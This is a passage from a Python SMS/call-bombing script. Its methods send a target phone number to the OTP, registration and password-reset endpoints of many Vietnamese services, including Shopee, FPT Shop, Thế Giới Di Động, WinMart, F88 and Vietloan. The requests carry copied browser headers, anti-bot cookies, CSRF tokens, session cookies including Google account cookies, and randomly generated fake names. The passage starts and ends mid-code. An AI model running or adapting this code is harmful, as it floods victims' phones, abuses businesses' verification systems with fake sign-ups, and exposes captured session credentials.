                    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://vieon.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://vieon.vn/auth/?destination=/&page=/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'username': sdt,
                    'country_code': 'VN',
                    'model': 'Windows 10',
                    'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
                    'device_name': 'Edge/127',
                    'device_type': 'desktop',
                    'platform': 'web',
                    'ui': '012021',
                },
            data={
                    'username': sdt,
                    'country_code': 'VN',
                    'model': 'Windows 10',
                    'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
                    'device_name': 'Edge/127',
                    'device_type': 'desktop',
                    'platform': 'web',
                    'ui': '012021',
                },
            params={
                    'platform': 'web',
                    'ui': '012021',
                },
            api_name="CALL_VIEON"
        )

    def send_call_ghn(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://sso.ghn.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://sso.ghn.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'phone': sdt,
                    'type': 'register',
                },
            data={
                    'phone': sdt,
                    'type': 'register',
                },
            api_name="CALL_GHN"
        )

    def send_call_lottemart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://www.lottemart.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'username': sdt,
                    'case': 'register',
                },
            data={
                    'username': sdt,
                    'case': 'register',
                },
            api_name="CALL_LOTTEMART"
        )

    def send_call_DONGCRE(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vayvnd.vn/v2/users/password-reset",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi-VN',
                    'content-type': 'application/json; charset=utf-8',
                    'dnt': '1',
                    'origin': 'https://vayvnd.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://vayvnd.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'site-id': '3',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'login': sdt,
                    'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
                },
            data={
                    'login': sdt,
                    'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
                },
            api_name="CALL_DONGCRE"
        )

    def send_call_shopee(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://shopee.vn/api/v4/otp/get_settings_v2",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'af-ac-enc-dat': '438deef2a644b9a6',
                    'af-ac-enc-sz-token': '',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://shopee.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-api-source': 'pc',
                    'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
                    'x-requested-with': 'XMLHttpRequest',
                    'x-sap-ri': '22d9a8667b497dfe94c089340401498ec675997cbc5522816f11',
                    'x-sap-sec': 'u476ZVItP6d5d4mjdbAXdgcjKHFhdxPj2bFOdZcj/6FRdZtjMbFndaJjNbFXdbcjQ6FYdbZjdbTKdgmj1HTVdihjXbTXdjLjDbTzdjUjGbAsdlmjYbA/dm3jZbA2dmmjabAVdyJjjbAXdzcjlbAzdzFjhHDpdCGjobD/dG3jEbDQdGZjHVDNdYLjObDDdYZjkbDbdwejIVDzdwUjLbAXdbFjdbA4pbTIj2Vwd6Fj0btjdycgdbAexbTfQbtjdbFjdYuMg3R2dbAfu+JgdbFjdbFicmAmm6FOr4gV0FVMdbTFRTFgdbFjGVM7BbUjdmmjdbFjdbJOjbFjdbFjdgp5d6FjdwnL2dnfehPjdbsORbUjdbFjdffRd6FjdbFjgFDdVQSzd6Fjnb8jdwFgdbFud6FjsbUjdzNzZqlVd6Fjvb8jdlFidbA2d6FjP1U0zzmgdbFuUwR1dbFjUEMSOBFjdZ04ObUjdaSwN7JjdbFlmb8jdfFidbFjdbTccbUjdbFjdbiAdVFjdbFj06mjdbTd7kdDOV8jdzb1b1qqfGpdmLdIqAAKbRL2SgDbBNg6B3nVd7kGR7z4+wJ7/SSwEScz+iqxyMwILgB12leqy9yJfu70zqiQnIK2ygQtEcp6oSZ42fKlHdCQVg5R19dNKIZ6UIIK0AzVwJsXTLbqq3J/i8rgxRmTn+rOOQG40bhL70hPMPRhbJAC+M0yWItYBwrvGjS4PdAPtn5ioTpEKu4zqw6ogq5Dc+AJpdsvRWZB71oRp6qeur1aMxYkXHiYukh88xRrpj+t5K+OndYJeXfMScjRaYcUbZItYcOAvG3gacwmnxPK9FVwLgq+pD0M3UxDWWEF3VrG1lEjFX8fe8CLeRmb9f7OmN78WcxxPrkRQp6oDTgiEgC8cLXyfNziJj26Ehw72GpZfVQTL83eiqN9PyHYVVdgBXRDzUlt2ZrTkam6CP9G0lNtX3EIzhx0zPNMjqianyiQlzOVpAePiwIH/6FjdbmjdbF4RkZoRbFjdGMmX/PwdbFjShlMH/8O2LUjdbFjQbFjdCetJ6y/XoLodbFjdbFjdbFldbFj4qNrSSX+3bFbdbFj6HTr22kcoV8pR8LkdbFjdbUjdbDaEVFjd6FjdwDhdbFzdbFjs0N2S6FjdbFzdbFjMRwF6HmjdbAwW0FyRbFjdfdtkbgwdbFj92xLl1DrRHgwdbFj2EfR0xPP0EJjdbFjQbFjdaZ586CeX0LoRbFjdzqIPjMgdbFjzOGjdbUjdbAjuHFjRbFjdzqIPjMwdbFj2vF4HLfdStgjdbFjQbFjdz9mxU80RDtYRbFjdfJ2+QgfdbFj/t8XdbJjdbFI2hl+KvZ426FjdbD=',
                    'x-shopee-language': 'vi',
                    'x-sz-sdk-version': '1.10.12',
                },
            cookies={
                    '_QPWSDCXHZQA': 'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740',
                    'REC7iLP4Q': '312bf815-7526-4121-82bf-61c29691b57f',
                    'SPC_F': 'eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq',
                    'REC_T_ID': '23f51dde-355f-11ef-bcef-3eebbabc6162',
                    'SPC_R_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
                    'SPC_R_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
                    'SPC_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
                    'SPC_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
                    '__LOCALE__null': 'VN',
                    'csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
                    'SPC_SI': 'p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=',
                    'SPC_SEC_SI': 'v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=',
                    '_sapid': '1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
                },
            json={
                    'operation': 8,
                    'encrypted_phone': '',
                    'phone': sdt,
                    'supported_channels': [
                        1,
                        2,
                        3,
                        6,
                        0,
                        5,
                    ],
                    'support_session': True,
                },
            data={
                    'operation': 8,
                    'encrypted_phone': '',
                    'phone': sdt,
                    'supported_channels': [
                        1,
                        2,
                        3,
                        6,
                        0,
                        5,
                    ],
                    'support_session': True,
                },
            api_name="CALL_SHOPEE"
        )

    def send_call_TGDD(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method="POST",
            headers={
                    'Accept': '*/*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://www.thegioididong.com',
                    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'TBMCookie_3209819802479625248': '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
                    '___utmvm': '###########',
                    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
                    'SvID': 'beline173|ZqjdK|ZqjdJ',
                    'DMX_Personal': '%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
                    'mwgngxpv': '3',
                    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY',
                },
            data={
                    'phoneNumber': sdt,
                    'isReSend': 'false',
                    'sendOTPType': '1',
                    '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
                },
            api_name="CALL_TGDD"
        )

    def send_call_fptshop(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'order-channel': '1',
                    'origin': 'https://fptshop.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://fptshop.com.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'fromSys': 'WEBKHICT',
                    'otpType': '0',
                    'phoneNumber': sdt,
                },
            data={
                    'fromSys': 'WEBKHICT',
                    'otpType': '0',
                    'phoneNumber': sdt,
                },
            api_name="CALL_FPTSHOP"
        )

    def send_call_WinMart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-crownx.winmart.vn/iam/api/v1/user/register",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'authorization': 'Bearer undefined',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://winmart.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://winmart.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-api-merchant': 'WCM',
                },
            json={
                    'firstName': 'Nguyễn Quang Ngọc',
                    'phoneNumber': sdt,
                    'masanReferralCode': '',
                    'dobDate': '2024-07-26',
                    'gender': 'Male',
                },
            data={
                    'firstName': 'Nguyễn Quang Ngọc',
                    'phoneNumber': sdt,
                    'masanReferralCode': '',
                    'dobDate': '2024-07-26',
                    'gender': 'Male',
                },
            api_name="CALL_WINMART"
        )

    def send_call_vietloan(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://vietloan.vn/register/phone-resend",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://vietloan.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://vietloan.vn/register',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-requested-with': 'XMLHttpRequest',
                },
            cookies={
                    '__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
                    'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
                    'sessionid': 'eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D',
                    'utm_uid': 'eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D',
                    'ec_cache_utm': '65518847-15fb-c698-6901-aae49c28ed93',
                    'ec_cache_client': 'false',
                    'ec_cache_client_utm': 'null',
                    'ec_png_utm': '65518847-15fb-c698-6901-aae49c28ed93',
                    'ec_png_client': 'false',
                    'ec_png_client_utm': 'null',
                    'ec_etag_client': 'false',
                    'ec_etag_utm': '65518847-15fb-c698-6901-aae49c28ed93',
                    'ec_etag_client_utm': 'null',
                    'uid': '65518847-15fb-c698-6901-aae49c28ed93',
                    'client': 'false',
                    'client_utm': 'null',
                },
            data={
                    'phone': sdt,
                    '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
                },
            api_name="CALL_VIETLOAN"
        )

    def send_call_lozi(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://mocha.lozi.vn/v1/invites/use-app",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://lozi.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://lozi.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-access-token': 'unknown',
                    'x-city-id': '50',
                    'x-lozi-client': '1',
                },
            json={
                    'countryCode': '84',
                    'phoneNumber': sdt,
                },
            data={
                    'countryCode': '84',
                    'phoneNumber': sdt,
                },
            api_name="CALL_LOZI"
        )

    def send_call_F88(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.f88.vn/growth/webf88vn/api/v1/Pawn",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://f88.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://f88.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'FullName': generate_random_name(),
                    'Phone': sdt,
                    'DistrictCode': '024',
                    'ProvinceCode': '02',
                    'AssetType': 'Car',
                    'IsChoose': '1',
                    'ShopCode': '',
                    'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
                    'FormType': 1,
                },
            data={
                    'FullName': generate_random_name(),
                    'Phone': sdt,
                    'DistrictCode': '024',
                    'ProvinceCode': '02',
                    'AssetType': 'Car',
                    'IsChoose': '1',
                    'ShopCode': '',
                    'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
                    'FormType': 1,
                },
            api_name="CALL_F88"
        )

    def send_call_spacet(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.google.com/recaptcha/api2/clr",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-protobuf',
                    'dnt': '1',
                    'origin': 'https://www.google.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&hl=vi&v=Xv-KF0LlBu_a0FJ9I5YSlX5m&size=invisible&cb=fo432ewf4lpx',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    '__Secure-3PAPISID': 'hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf',
                    '__Secure-3PSID': 'g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076',
                    'NID': '516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8-CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7